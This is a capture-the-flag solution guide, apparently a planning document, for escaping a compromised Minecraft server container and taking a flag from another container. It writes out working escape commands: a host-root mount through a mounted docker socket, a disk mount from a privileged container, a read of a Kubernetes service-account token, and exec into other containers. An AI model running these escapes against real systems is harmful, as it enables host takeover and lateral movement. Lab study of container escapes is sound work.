# Stolen Schematics - Complete Solution Guide

## Challenge Overview
- **Objective**: Escape a compromised Minecraft game server container and retrieve flag from another server
- **Connection**: `ssh player@instance.ctf.tdho.st -p 32904` (password: `reyalp`)
- **Time Limit**: 10 minutes per connection
- **Key Hint**: An older Docker image was accidentally left public on ghcr.io

## Solution Strategy

### Phase 1: Docker Image Analysis (DO THIS FIRST!)
The challenge explicitly mentions a public ghcr.io image - this is likely where the vulnerability is documented.

#### Step 1.1: Find the Docker Image
Try common patterns:
- `ghcr.io/talldwarf/minecraft-server`
- `ghcr.io/talldwarf/game-server`
- `ghcr.io/tdhost/minecraft`
- `ghcr.io/tdhost/game-server`

#### Step 1.2: Analyze Image History
Once found, look for:
- Exposed secrets/keys in layer history
- Misconfigured permissions
- Vulnerable configurations
- SSH keys or credentials

```bash
# Pull and inspect the image
docker pull ghcr.io/<org>/<name>:latest
docker history --no-trunc ghcr.io/<org>/<name>:latest
docker inspect ghcr.io/<org>/<name>:latest

# Run container and explore
docker run -it ghcr.io/<org>/<name>:latest /bin/sh
```

### Phase 2: SSH Connection and Container Analysis

#### Step 2.1: Connect via SSH
```bash
# Use WSL on Windows
wsl
ssh player@instance.ctf.tdho.st -p 32904
# Password: reyalp
```

#### Step 2.2: Identify Container Environment
```bash
# Confirm you're in a container
cat /proc/1/cgroup
ls -la /.dockerenv

# Check container runtime
cat /proc/self/mountinfo | grep -i docker
```

#### Step 2.3: Enumerate Escape Vectors

**A. Check Docker Socket Mount**
```bash
# Most common container escape
ls -la /var/run/docker.sock
# If exists, you can control Docker from inside!
```

**B. Check Capabilities**
```bash
# Dangerous capabilities that enable escape
capsh --print
cat /proc/self/status | grep Cap
```

**C. Check Privileged Mode**
```bash
# If privileged, you can escape via /dev/sda1
ip link add dummy0 type dummy
# If this works without error, likely privileged
```

**D. Check Host Mounts**
```bash
# Look for host filesystem mounts
mount | grep -v "overlay\|proc\|tmpfs"
df -h
```

### Phase 3: Container Escape Methods

#### Method A: Docker Socket Escape
If `/var/run/docker.sock` is mounted:
```bash
# List running containers
docker ps

# Start privileged container with host root mounted
docker run -v /:/host -it alpine /bin/sh
# Or Ubuntu if available
docker run -v /:/host -it ubuntu /bin/bash

# Once in new container
chroot /host /bin/bash
# You're now on the host!
```

#### Method B: Privileged Container Escape
If running with --privileged:
```bash
# Mount host disk
mkdir /tmp/hostfs
mount /dev/sda1 /tmp/hostfs
chroot /tmp/hostfs /bin/bash
```

#### Method C: Kubernetes Pod Escape
If in k8s environment:
```bash
# Check for service account token
cat /var/run/secrets/kubernetes.io/serviceaccount/token
# Use kubectl if available
```

#### Method D: Exploit Misconfigured Volumes
```bash
# Check for writable host paths
mount | grep rw
# Look for /root, /home, /etc mounted from host
```

### Phase 4: Post-Escape Reconnaissance

Once escaped to host:
```bash
# Find other containers
docker ps -a

# Find the target game server container
docker ps | grep -i game\|minecraft\|server

# Enter target container
docker exec -it <container_id> /bin/sh

# Find flag
find / -name "*flag*" -type f 2>/dev/null
find / -name "flag.txt" 2>/dev/null
cat /flag.txt
cat /root/flag.txt
cat /home/*/flag.txt
```

### Phase 5: Alternative - Malicious JAR Analysis

The challenge mentions a "malicious jar file":
```bash
# Find JAR files
find / -name "*.jar" 2>/dev/null

# Check running Java processes
ps aux | grep java

# Check for plugins directory (Minecraft servers)
ls -la ~/plugins/
ls -la /opt/minecraft/plugins/
ls -la /server/plugins/

# Analyze suspicious JARs
unzip -l suspicious.jar
# Look for backdoors, SSH keys, credentials
```

## Quick Win Checklist

1. **Before connecting to SSH**:
   - [ ] Pull and analyze ghcr.io Docker image
   - [ ] Look for exposed secrets in image history
   - [ ] Check for SSH keys in image layers

2. **After SSH connection**:
   - [ ] Check for `/var/run/docker.sock` (90% of CTF container escapes)
   - [ ] Check if privileged: `ip link add dummy0 type dummy`
   - [ ] Look for host mounts: `mount | grep -v overlay`
   - [ ] Find malicious JAR: `find / -name "*.jar"`

3. **After escape**:
   - [ ] List all containers: `docker ps -a`
   - [ ] Access target container
   - [ ] Find and read flag

## Common Flag Locations
- `/flag.txt`
- `/root/flag.txt`
- `/home/*/flag.txt`
- `/opt/flag.txt`
- `/var/flag.txt`
- Environment variable: `env | grep -i flag`

## Time Management (10-minute limit)
- **Minute 0-2**: Docker image analysis (if not done beforehand)
- **Minute 2-3**: SSH connection and quick enumeration
- **Minute 3-5**: Attempt docker socket escape
- **Minute 5-7**: Alternative escape method if needed
- **Minute 7-9**: Find target container and flag
- **Minute 9-10**: Submit flag

## Notes
- The password "reyalp" is "player" backwards (hint about reversing/escaping?)
- Focus on Docker socket first - it's the most common CTF escape
- The ghcr.io image likely contains the key to the solution
